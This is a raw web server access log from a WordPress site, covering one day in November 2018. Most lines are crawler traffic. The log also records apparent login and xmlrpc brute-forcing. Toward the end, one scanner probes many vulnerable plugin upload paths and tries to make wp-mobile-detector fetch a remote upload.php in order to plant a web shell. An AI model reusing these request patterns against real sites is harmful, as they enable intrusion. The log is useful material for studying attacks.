97.74.228.115 - - [01/Nov/2018:03:12:43 +0000] "POST /xmlrpc.php HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
18.206.162.254 - - [01/Nov/2018:03:17:55 +0000] "GET /wp-login.php HTTP/1.1" 200 1537 "https://www.google.com/url?f56203b63b529ba33edb8360c0052b8c" "Mozilla/5.0 (Windows NT 6.2; rv:28.0) Gecko/20100101 Firefox/28.0"
18.206.162.254 - - [01/Nov/2018:03:17:56 +0000] "POST /wp-login.php HTTP/1.1" 200 2073 "https://www.google.com/url?f56203b63b529ba33edb8360c0052b8c" "Mozilla/5.0 (Windows NT 6.2; rv:28.0) Gecko/20100101 Firefox/28.0"
54.36.148.231 - - [01/Nov/2018:03:52:30 +0000] "GET /feed/ HTTP/1.1" 200 22788 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
180.76.15.160 - - [01/Nov/2018:04:20:09 +0000] "GET / HTTP/1.1" 200 19552 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
176.8.88.12 - - [01/Nov/2018:04:22:27 +0000] "GET / HTTP/1.1" 200 77374 "http://sweet.tv/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 8.01"
176.8.88.12 - - [01/Nov/2018:04:22:29 +0000] "GET / HTTP/1.1" 200 77278 "http://sweet.tv/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 8.01"
207.46.13.184 - - [01/Nov/2018:04:27:58 +0000] "GET /video/feed/ HTTP/1.1" 200 752 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
134.249.54.255 - - [01/Nov/2018:04:28:12 +0000] "GET / HTTP/1.1" 200 77470 "https://komp-pomosch.ru/" "Mozilla/4.0 (compatible; MSIE 5.0; Windows 95) Opera 6.01  [en]"
134.249.54.255 - - [01/Nov/2018:04:28:14 +0000] "GET / HTTP/1.1" 200 1079 "https://komp-pomosch.ru/" "Mozilla/4.0 (compatible; MSIE 5.0; Windows 95) Opera 6.01  [en]"
97.74.228.115 - - [01/Nov/2018:05:06:27 +0000] "POST /xmlrpc.php HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
54.174.23.26 - - [01/Nov/2018:05:39:39 +0000] "GET /feed/ HTTP/1.1" 304 0 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17"
18.206.162.254 - - [01/Nov/2018:05:46:43 +0000] "GET /wp-login.php HTTP/1.1" 200 1593 "https://www.google.com/url?f56203b63b529ba33edb8360c0052b8c" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0"
18.206.162.254 - - [01/Nov/2018:05:47:11 +0000] "POST /wp-login.php HTTP/1.1" 200 1828 "https://www.google.com/url?f56203b63b529ba33edb8360c0052b8c" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0"
176.8.88.12 - - [01/Nov/2018:06:08:48 +0000] "GET / HTTP/1.1" 200 1074 "https://pp-budpostach.com.ua/g835191-stoimost-gazobloka-gazobetona" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
93.75.45.115 - - [01/Nov/2018:06:22:16 +0000] "GET /wp-login.php HTTP/1.1" 200 2881 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
93.75.45.115 - - [01/Nov/2018:06:22:16 +0000] "GET / HTTP/1.1" 301 5 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
93.75.45.115 - - [01/Nov/2018:06:22:18 +0000] "GET / HTTP/1.1" 200 77425 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
93.75.45.115 - - [01/Nov/2018:06:23:43 +0000] "GET /wp-login.php HTTP/1.1" 200 2851 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
93.75.45.115 - - [01/Nov/2018:06:23:44 +0000] "GET / HTTP/1.1" 200 77253 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
139.81.74.206 - - [01/Nov/2018:06:29:06 +0000] "GET / HTTP/1.1" 200 19744 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
97.74.228.115 - - [01/Nov/2018:06:58:13 +0000] "POST /xmlrpc.php HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
54.36.148.49 - - [01/Nov/2018:06:58:53 +0000] "GET /wp-content/uploads/2017/03/concept-02.jpg HTTP/1.1" 200 83742 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
35.189.254.210 - - [01/Nov/2018:06:58:56 +0000] "HEAD / HTTP/1.1" 301 0 "-" "-"
35.189.254.210 - - [01/Nov/2018:06:58:56 +0000] "HEAD / HTTP/1.1" 200 0 "-" "-"
35.189.254.210 - - [01/Nov/2018:06:58:57 +0000] "GET / HTTP/1.1" 301 5 "-" "-"
35.189.254.210 - - [01/Nov/2018:06:58:57 +0000] "GET / HTTP/1.1" 200 77413 "-" "-"
42.236.99.9 - - [01/Nov/2018:07:09:21 +0000] "GET / HTTP/1.1" 301 5 "http://www.supermonkeystar.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
42.236.99.9 - - [01/Nov/2018:07:09:30 +0000] "GET / HTTP/1.1" 200 20016 "http://supermonkeystar.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
42.236.99.194 - - [01/Nov/2018:07:09:40 +0000] "GET / HTTP/1.1" 200 19359 "http://supermonkeystar.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
52.173.241.248 - - [01/Nov/2018:07:38:20 +0000] "GET / HTTP/1.1" 200 686 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
123.125.67.158 - - [01/Nov/2018:07:58:35 +0000] "GET /robots.txt HTTP/1.1" 200 92 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
176.8.88.12 - - [01/Nov/2018:08:06:44 +0000] "GET / HTTP/1.1" 200 1068 "http://www.stroi-24.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; MRA 4.6 (build 01425); .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
176.8.88.12 - - [01/Nov/2018:08:06:45 +0000] "GET / HTTP/1.1" 200 1074 "http://www.stroi-24.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; MRA 4.6 (build 01425); .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
176.8.88.12 - - [01/Nov/2018:08:06:45 +0000] "GET / HTTP/1.1" 200 1103 "http://www.stroi-24.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; MRA 4.6 (build 01425); .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
123.125.71.28 - - [01/Nov/2018:08:22:22 +0000] "GET /robots.txt HTTP/1.1" 200 92 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
97.74.228.115 - - [01/Nov/2018:08:54:27 +0000] "POST /xmlrpc.php HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
185.117.118.146 - - [01/Nov/2018:09:37:58 +0000] "GET /robots.txt HTTP/1.1" 200 92 "-" "Mozilla/5.0 (compatible; Uptimebot/1.0; +http://www.uptime.com/uptimebot)"
185.117.118.149 - - [01/Nov/2018:09:37:59 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; Uptimebot/1.0; +http://www.uptime.com/uptimebot)"
66.70.217.179 - - [01/Nov/2018:09:47:54 +0000] "GET /wp-login.php HTTP/1.1" 200 2868 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15"
66.70.217.179 - - [01/Nov/2018:09:47:57 +0000] "POST /wp-login.php HTTP/1.0" 200 3072 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15"
52.37.108.40 - - [01/Nov/2018:09:57:47 +0000] "GET /wp-login.php HTTP/1.1" 200 1587 "https://www.google.com/url?f56203b63b529ba33edb8360c0052b8c" "Mozilla/5.0 (Windows NT 6.2; rv:31.0) Gecko/20100101 Firefox/31.0"
52.37.108.40 - - [01/Nov/2018:09:58:00 +0000] "POST /wp-login.php HTTP/1.1" 200 1756 "https://www.google.com/url?f56203b63b529ba33edb8360c0052b8c" "Mozilla/5.0 (Windows NT 6.2; rv:31.0) Gecko/20100101 Firefox/31.0"
83.134.79.125 - - [01/Nov/2018:10:29:02 +0000] "GET /wp-login.php HTTP/1.1" 200 2885 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
83.134.79.125 - - [01/Nov/2018:10:29:02 +0000] "GET / HTTP/1.1" 301 5 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
83.134.79.125 - - [01/Nov/2018:10:29:03 +0000] "GET / HTTP/1.1" 200 77421 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
83.134.79.125 - - [01/Nov/2018:10:37:00 +0000] "GET /wp-login.php HTTP/1.1" 200 2896 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
83.134.79.125 - - [01/Nov/2018:10:37:00 +0000] "GET / HTTP/1.1" 200 77231 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
97.74.228.115 - - [01/Nov/2018:10:50:36 +0000] "POST /xmlrpc.php HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
104.131.254.50 - - [01/Nov/2018:11:16:51 +0000] "GET /wp-content/themes/pridmag/db.php HTTP/1.1" 404 78498 "supermonkeystar.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36"
120.35.38.212 - - [01/Nov/2018:11:59:34 +0000] "HEAD /wp-content/themes/twentyseventeen/sidebar.php HTTP/1.1" 200 0 "-" "-"
31.170.123.73 - - [01/Nov/2018:13:06:41 +0000] "POST /wp-cron.php?doing_wp_cron=1541077600.9699270725250244140625 HTTP/1.1" 499 0 "http://supermonkeystar.com/wp-cron.php?doing_wp_cron=1541077600.9699270725250244140625" "WordPress/4.7.11; http://supermonkeystar.com"
37.9.113.42 - - [01/Nov/2018:13:06:42 +0000] "GET /robots.txt HTTP/1.1" 200 78 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
178.154.244.60 - - [01/Nov/2018:13:06:45 +0000] "GET / HTTP/1.1" 200 19956 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
97.74.228.115 - - [01/Nov/2018:13:06:49 +0000] "POST /xmlrpc.php HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
31.170.123.73 - - [01/Nov/2018:13:10:33 +0000] "POST /wp-cron.php?doing_wp_cron=1541077833.1828300952911376953125 HTTP/1.1" 200 40 "http://supermonkeystar.com/wp-cron.php?doing_wp_cron=1541077833.1828300952911376953125" "WordPress/4.7.11; http://supermonkeystar.com"
54.36.150.87 - - [01/Nov/2018:13:10:33 +0000] "GET /robots.txt HTTP/1.1" 200 92 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
37.9.113.40 - - [01/Nov/2018:13:29:28 +0000] "GET /video-vimeo/feed/ HTTP/1.1" 200 764 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
180.76.15.8 - - [01/Nov/2018:13:40:35 +0000] "GET /embed/ HTTP/1.1" 301 5 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.147 - - [01/Nov/2018:13:40:36 +0000] "GET / HTTP/1.1" 200 19387 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
213.49.34.173 - - [01/Nov/2018:14:13:09 +0000] "GET /wp-login.php HTTP/1.1" 200 2874 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
213.49.34.173 - - [01/Nov/2018:14:13:10 +0000] "GET / HTTP/1.1" 301 5 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
213.49.34.173 - - [01/Nov/2018:14:13:11 +0000] "GET / HTTP/1.1" 200 77302 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
213.49.34.173 - - [01/Nov/2018:14:13:14 +0000] "GET /wp-login.php HTTP/1.1" 200 2880 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
213.49.34.173 - - [01/Nov/2018:14:13:14 +0000] "GET / HTTP/1.1" 200 77514 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
80.90.55.168 - - [01/Nov/2018:14:23:07 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; Uptimebot/1.0; +http://www.uptime.com/uptimebot)"
18.188.255.25 - - [01/Nov/2018:14:41:12 +0000] "GET /wp-login.php HTTP/1.1" 200 1588 "https://www.google.com/url?f56203b63b529ba33edb8360c0052b8c" "Mozilla/5.0 (Windows NT 6.0; rv:36.0) Gecko/20100101 Firefox/36.0"
18.188.255.25 - - [01/Nov/2018:14:41:26 +0000] "POST /wp-login.php HTTP/1.1" 200 2035 "https://www.google.com/url?f56203b63b529ba33edb8360c0052b8c" "Mozilla/5.0 (Windows NT 6.0; rv:36.0) Gecko/20100101 Firefox/36.0"
97.74.228.115 - - [01/Nov/2018:15:05:38 +0000] "POST /xmlrpc.php HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
81.17.27.138 - - [01/Nov/2018:16:03:55 +0000] "GET /wp-login.php HTTP/1.1" 200 2891 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15"
81.17.27.138 - - [01/Nov/2018:16:03:57 +0000] "POST /wp-login.php HTTP/1.0" 200 3072 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15"
157.55.39.130 - - [01/Nov/2018:16:09:30 +0000] "GET /home/feed/ HTTP/1.1" 200 743 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
97.74.228.115 - - [01/Nov/2018:17:05:19 +0000] "POST /xmlrpc.php HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
178.154.244.10 - - [01/Nov/2018:17:15:04 +0000] "GET /robots.txt HTTP/1.1" 200 78 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
178.154.244.10 - - [01/Nov/2018:17:15:08 +0000] "GET /2014/08/ HTTP/1.1" 200 15749 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
2001:41d0:2:8ac5:: - - [01/Nov/2018:17:17:12 +0000] "GET /seomarket.php HTTP/1.1" 404 30628 "supermonkeystar.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36"
178.255.215.79 - - [01/Nov/2018:17:32:44 +0000] "GET /robots.txt HTTP/1.1" 200 92 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
178.255.215.79 - - [01/Nov/2018:17:32:45 +0000] "GET / HTTP/1.1" 200 20032 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
178.255.215.79 - - [01/Nov/2018:17:32:54 +0000] "GET /feed/ HTTP/1.1" 200 22825 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
178.255.215.79 - - [01/Nov/2018:17:32:57 +0000] "GET /comments/feed/ HTTP/1.1" 200 772 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
178.255.215.79 - - [01/Nov/2018:17:32:59 +0000] "GET /home/feed/ HTTP/1.1" 200 731 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
123.125.71.117 - - [01/Nov/2018:17:53:09 +0000] "GET /robots.txt HTTP/1.1" 200 92 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
110.141.108.59 - - [01/Nov/2018:17:53:48 +0000] "POST /wp-login.php HTTP/1.1" 200 1844 "http://supermonkeystar.com/wp-login.php" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/534.03.50 (KHTML, like Gecko) Chrome/57.4.9125.4853 Safari/533.32"
95.163.255.103 - - [01/Nov/2018:18:00:15 +0000] "GET /robots.txt HTTP/1.1" 200 92 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)"
95.163.255.109 - - [01/Nov/2018:18:00:16 +0000] "GET /post_tag-sitemap.xml HTTP/1.1" 200 463 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)"
2001:41d0:8:d1e0:: - - [01/Nov/2018:18:20:47 +0000] "GET /wp-main.php HTTP/1.1" 404 30805 "supermonkeystar.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36"
66.249.66.140 - - [01/Nov/2018:18:21:21 +0000] "GET /category-sitemap.xml HTTP/1.1" 200 508 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
123.125.71.114 - - [01/Nov/2018:18:22:23 +0000] "GET /robots.txt HTTP/1.1" 200 92 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
46.119.113.248 - - [01/Nov/2018:18:35:24 +0000] "GET / HTTP/1.1" 200 1091 "http://phinist.net/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)"
46.119.113.248 - - [01/Nov/2018:18:35:25 +0000] "GET / HTTP/1.1" 200 1080 "http://phinist.net/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)"
46.119.113.248 - - [01/Nov/2018:18:35:26 +0000] "GET / HTTP/1.1" 200 1068 "http://phinist.net/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)"
18.232.156.178 - - [01/Nov/2018:18:47:33 +0000] "GET /feed/ HTTP/1.1" 304 0 "https://www.google.com/" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.13; ) Gecko/20101203"
145.239.29.60 - - [01/Nov/2018:18:56:27 +0000] "GET /user/login HTTP/1.1" 404 10048 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:27 +0000] "GET /wp-login.php HTTP/1.1" 200 1522 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:28 +0000] "GET /administrator HTTP/1.1" 404 10339 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:28 +0000] "GET / HTTP/1.1" 200 19964 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:29 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 500 3613 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:29 +0000] "GET /wp-admin/install.php HTTP/1.1" 200 692 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:30 +0000] "GET /installation/index.php HTTP/1.1" 301 5 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:30 +0000] "GET /installation/ HTTP/1.1" 404 10211 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:30 +0000] "POST /wp-admin/admin-ajax.php?param=upload_slide&action=upload_library HTTP/1.1" 200 43 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:32 +0000] "GET /wp-content/jssor-slider/jssor-uploads/atx.phtml HTTP/1.1" 404 17134 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:32 +0000] "POST /?gf_page=upload HTTP/1.1" 404 9785 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:32 +0000] "GET /_input__atx.phtml HTTP/1.1" 404 9870 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:33 +0000] "GET /wp-content/plugins/wp-mobile-detector/resize.php?src=https://gist.githubusercontent.com/taterbase/2688850/raw/b9d214c9cbcf624e13c825d4de663e77bf38cc14/upload.php HTTP/1.1" 404 17401 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:34 +0000] "GET /wp-content/plugins/wp-mobile-detector/cache/upload.php HTTP/1.1" 404 17016 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:35 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 43 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:36 +0000] "GET /wp-content/plugins/revslider/temp/update_extract/attari.php HTTP/1.1" 404 16713 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:36 +0000] "POST /wp-admin/admin.php?page=levoslideshow_manage HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:37 +0000] "GET /wp-login.php?redirect_to=http%3A%2F%2Fsupermonkeystar.com%2Fwp-admin%2Fadmin.php%3Fpage%3Dlevoslideshow_manage&reauth=1 HTTP/1.1" 200 1669 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:38 +0000] "GET /wp-content/uploads/levoslideshow/1_uploadfolder/big/up.php HTTP/1.1" 404 17561 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:39 +0000] "POST /wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/ HTTP/1.1" 404 16958 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:39 +0000] "GET /wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/up.php HTTP/1.1" 404 16766 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:40 +0000] "POST /wp-content/plugins/sexy-contact-form/includes/fileupload/index.php HTTP/1.1" 404 17486 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:42 +0000] "GET /wp-content/plugins/sexy-contact-form/includes/fileupload/files/up.php HTTP/1.1" 404 17229 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:42 +0000] "POST /wp-content/plugins/dzs-zoomsounds/admin/upload.php HTTP/1.1" 404 16657 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:43 +0000] "GET /wp-content/plugins/dzs-zoomsounds/admin/upload/up.php HTTP/1.1" 404 17008 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:44 +0000] "POST /wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php HTTP/1.1" 404 17111 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:45 +0000] "GET /wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/up.php HTTP/1.1" 404 17186 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:46 +0000] "POST /wp-admin/admin.php?page=slideshowpro_manage HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:46 +0000] "GET /wp-login.php?redirect_to=http%3A%2F%2Fsupermonkeystar.com%2Fwp-admin%2Fadmin.php%3Fpage%3Dslideshowpro_manage&reauth=1 HTTP/1.1" 200 1629 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:47 +0000] "GET /wp-content/uploads/slideshowpro/1_uploadfolder/big/up.php HTTP/1.1" 404 16747 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:48 +0000] "POST /wp-content/plugins/simple-ads-manager/sam-ajax-admin.php HTTP/1.1" 404 16957 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:49 +0000] "GET /wp-content/plugins/simple-ads-manager/up.php HTTP/1.1" 404 16529 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:49 +0000] "POST /wp-admin/admin.php?page=powerzoomer_manage HTTP/1.1" 302 5 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
145.239.29.60 - - [01/Nov/2018:18:56:50 +0000] "GET /wp-login.php?redirect_to=http%3A%2F%2Fsupermonkeystar.com%2Fwp-admin%2Fadmin.php%3Fpage%3Dpowerzoomer_manage&reauth=1 HTTP/1.1" 200 1683 "-" "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"
